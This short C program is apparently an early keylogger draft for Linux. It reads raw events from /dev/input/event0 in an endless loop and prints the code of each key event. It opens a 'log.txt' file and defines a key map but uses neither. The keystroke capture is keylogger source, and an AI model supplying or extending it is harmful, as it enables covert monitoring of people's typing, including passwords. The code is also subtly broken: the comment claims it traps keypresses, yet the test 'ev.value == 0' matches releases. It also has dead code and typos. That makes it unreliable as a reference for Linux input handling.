#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define LOG "log.txt"

int main(int argc, char **arcgv){
    struct input_event ev; //monitors input event
    
    char *map = "..1234567890....qwertyuiop....asdfghjkl....zxcvbnm"; //character map

    int fd = open("/dev/input/event0", O_RDONLY); //grabs keyboard event handler, REF: $(man 3 fopen)

    FILE *fp = fopen(LOG, "a"); //different funtion argument structure in stdio.h


    while(1){
        read(fd, &ev, sizeof(ev)); // REF: $(nvim /usr/include/linux/input.h), https://https://kernel.org/doc/Documentation/input/input.txt
        if ((ev.type == EV_KEY) && (ev.value == 0)) {//Trapping keypress not key releases
          printf("%d\n", ev.code);  //Keycodes: $(nvim /usr/include/linux/input-event-codes.h)
        }
    } 
}
